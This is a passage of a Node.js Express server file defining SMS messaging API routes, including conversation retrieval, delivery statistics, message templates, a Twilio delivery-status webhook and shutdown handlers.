// Get SMS messages from database for conversation view
app.get("/api/sms/messages/conversation/:phone", async (req, res) => {
  try {
    const { phone } = req.params;
    const limit = Math.min(parseInt(req.query.limit) || 50, 100);

    if (!phone) {
      return res.status(400).json({
        success: false,
        error: "Phone number is required",
      });
    }

    const messages = await db.getSMSConversation(phone, limit);

    res.json({
      success: true,
      phone: phone,
      messages: messages,
      message_count: messages.length,
    });
  } catch (error) {
    console.error("❌ Error fetching SMS conversation from database:", error);
    res.status(500).json({
      success: false,
      error: "Failed to fetch conversation",
      details: error.message,
    });
  }
});

// Get recent SMS messages from database
app.get("/api/sms/messages/recent", async (req, res) => {
  try {
    const limit = Math.min(parseInt(req.query.limit) || 10, 50);
    const offset = parseInt(req.query.offset) || 0;

    const messages = await db.getSMSMessages(limit, offset);

    res.json({
      success: true,
      messages: messages,
      count: messages.length,
      limit: limit,
      offset: offset,
    });
  } catch (error) {
    console.error("❌ Error fetching recent SMS messages:", error);
    res.status(500).json({
      success: false,
      error: "Failed to fetch recent messages",
      details: error.message,
    });
  }
});

// Get SMS database statistics
app.get("/api/sms/database-stats", async (req, res) => {
  try {
    const hours = parseInt(req.query.hours) || 24;
    const dateFrom = new Date(
      Date.now() - hours * 60 * 60 * 1000,
    ).toISOString();

    // Get comprehensive SMS statistics from database
    const stats = await new Promise((resolve, reject) => {
      const queries = {
        // Total messages
        totalMessages: `SELECT COUNT(*) as count FROM sms_messages`,

        // Messages by direction
        messagesByDirection: `
                    SELECT direction, COUNT(*) as count 
                    FROM sms_messages 
                    GROUP BY direction
                `,

        // Messages by status
        messagesByStatus: `
                    SELECT status, COUNT(*) as count 
                    FROM sms_messages 
                    GROUP BY status
                    ORDER BY count DESC
                `,

        // Recent messages
        recentMessages: `
                    SELECT * FROM sms_messages 
                    WHERE created_at >= ?
                    ORDER BY created_at DESC 
                    LIMIT 5
                `,

        // Bulk operations
        bulkOperations: `SELECT COUNT(*) as count FROM bulk_sms_operations`,

        // Recent bulk operations
        recentBulkOps: `
                    SELECT * FROM bulk_sms_operations 
                    WHERE created_at >= ?
                    ORDER BY created_at DESC 
                    LIMIT 3
                `,
      };

      const results = {};
      let completed = 0;
      const total = Object.keys(queries).length;

      for (const [key, query] of Object.entries(queries)) {
        const params = ["recentMessages", "recentBulkOps"].includes(key)
          ? [dateFrom]
          : [];

        db.db.all(query, params, (err, rows) => {
          if (err) {
            console.error(`SMS stats query error for ${key}:`, err);
            results[key] = key.includes("recent") ? [] : [{ count: 0 }];
          } else {
            results[key] = rows || [];
          }

          completed++;
          if (completed === total) {
            resolve(results);
          }
        });
      }
    });

    // Process the statistics
    const processedStats = {
      total_messages: stats.totalMessages[0]?.count || 0,
      sent_messages:
        stats.messagesByDirection.find((d) => d.direction === "outbound")
          ?.count || 0,
      received_messages:
        stats.messagesByDirection.find((d) => d.direction === "inbound")
          ?.count || 0,
      delivered_count:
        stats.messagesByStatus.find((s) => s.status === "delivered")?.count ||
        0,
      failed_count:
        stats.messagesByStatus.find((s) => s.status === "failed")?.count || 0,
      pending_count:
        stats.messagesByStatus.find((s) => s.status === "pending")?.count || 0,
      bulk_operations: stats.bulkOperations[0]?.count || 0,
      recent_messages: stats.recentMessages || [],
      recent_bulk_operations: stats.recentBulkOps || [],
      status_breakdown: stats.messagesByStatus || [],
      direction_breakdown: stats.messagesByDirection || [],
      time_period_hours: hours,
    };

    // Calculate success rate
    const totalSent = processedStats.sent_messages;
    const delivered = processedStats.delivered_count;
    processedStats.success_rate =
      totalSent > 0 ? Math.round((delivered / totalSent) * 100) : 0;

    res.json({
      success: true,
      ...processedStats,
    });
  } catch (error) {
    console.error("❌ Error fetching SMS database statistics:", error);
    res.status(500).json({
      success: false,
      error: "Failed to fetch database statistics",
      details: error.message,
    });
  }
});

// Get SMS status by message SID
app.get("/api/sms/status/:messageSid", async (req, res) => {
  try {
    const { messageSid } = req.params;

    const message = await new Promise((resolve, reject) => {
      db.db.get(
        `SELECT * FROM sms_messages WHERE message_sid = ?`,
        [messageSid],
        (err, row) => {
          if (err) {
            reject(err);
          } else {
            resolve(row);
          }
        },
      );
    });

    if (!message) {
      return res.status(404).json({
        success: false,
        error: "Message not found",
      });
    }

    res.json({
      success: true,
      message: message,
    });
  } catch (error) {
    console.error("❌ Error fetching SMS status:", error);
    res.status(500).json({
      success: false,
      error: "Failed to fetch message status",
      details: error.message,
    });
  }
});

// Enhanced SMS scripts endpoint with better error handling
app.get(
  "/api/sms/scripts/:scriptName?",
  requireAdminToken,
  async (req, res) => {
    try {
      const { scriptName } = req.params;
      const { variables } = req.query;

      // Built-in scripts (fallback)
      const builtInScripts = {
        welcome:
          "Welcome to our service! We're excited to have you aboard. Reply HELP for assistance or STOP to unsubscribe.",
        appointment_reminder:
          "Reminder: You have an appointment on {date} at {time}. Reply CONFIRM to confirm or RESCHEDULE to change.",
        verification:
          "Your verification code is: {code}. This code will expire in 10 minutes. Do not share this code with anyone.",
        order_update:
          "Order #{order_id} update: {status}. Track your order at {tracking_url}",
        payment_reminder:
          "Payment reminder: Your payment of {amount} is due on {due_date}. Pay now: {payment_url}",
        promotional:
          "🎉 Special offer just for you! {offer_text} Use code {promo_code}. Valid until {expiry_date}. Reply STOP to opt out.",
        customer_service:
          "Thanks for contacting us! We've received your message and will respond within 24 hours. For urgent matters, call {phone}.",
        survey:
          "How was your experience with us? Rate us 1-5 stars by replying with a number. Your feedback helps us improve!",
      };

      if (scriptName) {
        // Get specific script
        if (!builtInScripts[scriptName]) {
          return res.status(404).json({
            success: false,
            error: `Script '${scriptName}' not found`,
          });
        }

        let script = builtInScripts[scriptName];
        let parsedVariables = {};

        // Parse and apply variables if provided
        if (variables) {
          try {
            parsedVariables = JSON.parse(variables);

            // Replace variables in script
            for (const [key, value] of Object.entries(parsedVariables)) {
              script = script.replace(new RegExp(`{${key}}`, "g"), value);
            }
          } catch (parseError) {
            console.error("Error parsing script variables:", parseError);
            // Continue with script without variable substitution
          }
        }

        res.json({
          success: true,
          script_name: scriptName,
          script: script,
          original_script: builtInScripts[scriptName],
          variables: parsedVariables,
        });
      } else {
        // Get list of available scripts
        res.json({
          success: true,
          available_scripts: Object.keys(builtInScripts),
          script_count: Object.keys(builtInScripts).length,
        });
      }
    } catch (error) {
      console.error("❌ Error handling SMS scripts:", error);
      res.status(500).json({
        success: false,
        error: "Failed to process script request",
        details: error.message,
      });
    }
  },
);

// SMS webhook delivery status notifications (enhanced)
app.post("/webhook/sms-delivery", async (req, res) => {
  try {
    if (!requireValidTwilioSignature(req, res, "/webhook/sms-delivery")) {
      return;
    }
    const { MessageSid, MessageStatus, ErrorCode, ErrorMessage, To, From } =
      req.body;

    console.log(`📱 SMS Delivery Status: ${MessageSid} -> ${MessageStatus}`);

    // Update message status in database
    if (db) {
      await db.updateSMSStatus(MessageSid, {
        status: MessageStatus,
        error_code: ErrorCode,
        error_message: ErrorMessage,
      });

      // Get the original message to find user_chat_id for notification
      const message = await new Promise((resolve, reject) => {
        db.db.get(
          `SELECT * FROM sms_messages WHERE message_sid = ?`,
          [MessageSid],
          (err, row) => {
            if (err) reject(err);
            else resolve(row);
          },
        );
      });

      // Create webhook notification if user_chat_id exists
      if (message && message.user_chat_id) {
        const notificationType =
          MessageStatus === "delivered"
            ? "sms_delivered"
            : MessageStatus === "failed"
              ? "sms_failed"
              : `sms_${MessageStatus}`;

        await db.createEnhancedWebhookNotification(
          MessageSid,
          notificationType,
          message.user_chat_id,
          MessageStatus === "failed" ? "high" : "normal",
        );

        console.log(
          `📨 Created ${notificationType} notification for user ${message.user_chat_id}`,
        );
      }
    }

    res.status(200).send("OK");
  } catch (error) {
    console.error("❌ SMS delivery webhook error:", error);
    res.status(200).send("OK"); // Always return 200 to prevent retries
  }
});

// Get SMS statistics
app.get("/api/sms/stats", async (req, res) => {
  try {
    const stats = smsService.getStatistics();
    const activeConversations = smsService.getActiveConversations();

    res.json({
      success: true,
      statistics: stats,
      active_conversations: activeConversations.slice(0, 20), // Last 20 conversations
      sms_service_enabled: true,
    });
  } catch (error) {
    console.error("❌ SMS stats error:", error);
    res.status(500).json({
      success: false,
      error: "Failed to get SMS statistics",
    });
  }
});

// Bulk SMS status endpoint
app.get("/api/sms/bulk/status", async (req, res) => {
  try {
    const limit = Math.min(parseInt(req.query.limit) || 10, 50);
    const hours = parseInt(req.query.hours) || 24;
    const dateFrom = new Date(
      Date.now() - hours * 60 * 60 * 1000,
    ).toISOString();

    const bulkOperations = await new Promise((resolve, reject) => {
      db.db.all(
        `
                SELECT * FROM bulk_sms_operations 
                WHERE created_at >= ?
                ORDER BY created_at DESC 
                LIMIT ?
            `,
        [dateFrom, limit],
        (err, rows) => {
          if (err) {
            reject(err);
          } else {
            resolve(rows || []);
          }
        },
      );
    });

    // Get summary statistics
    const summary = bulkOperations.reduce(
      (acc, op) => {
        acc.totalOperations += 1;
        acc.totalRecipients += op.total_recipients;
        acc.totalSuccessful += op.successful;
        acc.totalFailed += op.failed;
        return acc;
      },
      {
        totalOperations: 0,
        totalRecipients: 0,
        totalSuccessful: 0,
        totalFailed: 0,
      },
    );

    summary.successRate =
      summary.totalRecipients > 0
        ? Math.round((summary.totalSuccessful / summary.totalRecipients) * 100)
        : 0;

    res.json({
      success: true,
      summary: summary,
      operations: bulkOperations,
      time_period_hours: hours,
    });
  } catch (error) {
    console.error("❌ Error fetching bulk SMS status:", error);
    res.status(500).json({
      success: false,
      error: "Failed to fetch bulk SMS status",
      details: error.message,
    });
  }
});

if (require.main === module) {
  startServer();
}

module.exports = { app, startServer };

// Enhanced graceful shutdown with comprehensive cleanup
process.on("SIGINT", async () => {
  console.log("\n🛑 Shutting down enhanced adaptive system gracefully...");

  try {
    // Log shutdown start
    await db.logServiceHealth("system", "shutdown_initiated", {
      active_calls: callConfigurations.size,
      tracked_calls: callFunctionSystems.size,
    });

    // Stop services
    webhookService.stop();
    callConfigurations.clear();
    callFunctionSystems.clear();
    callDirections.clear();

    // Log successful shutdown
    await db.logServiceHealth("system", "shutdown_completed", {
      timestamp: new Date().toISOString(),
    });

    await db.close();
    console.log("✅ Enhanced adaptive system shutdown complete");
  } catch (shutdownError) {
    console.error("❌ Error during shutdown:", shutdownError);
  }

  process.exit(0);
});

process.on("SIGTERM", async () => {
  console.log("\nShutting down enhanced adaptive system gracefully...");

  try {
    // Log shutdown start
    await db.logServiceHealth("system", "shutdown_initiated", {
      active_calls: callConfigurations.size,
      tracked_calls: callFunctionSystems.size,
      reason: "SIGTERM",
    });

    // Stop services
    webhookService.stop();
    callConfigurations.clear();
    callFunctionSystems.clear();
    callDirections.clear();

    // Log successful shutdown
    await db.logServiceHealth("system", "shutdown_completed", {
      timestamp: new Date().toISOString(),
    });

    await db.close();
    console.log("Enhanced adaptive system shutdown complete");
  } catch (shutdownError) {
    console.error("Error during shutdown:", shutdownError);
  }

  process.exit(0);
});
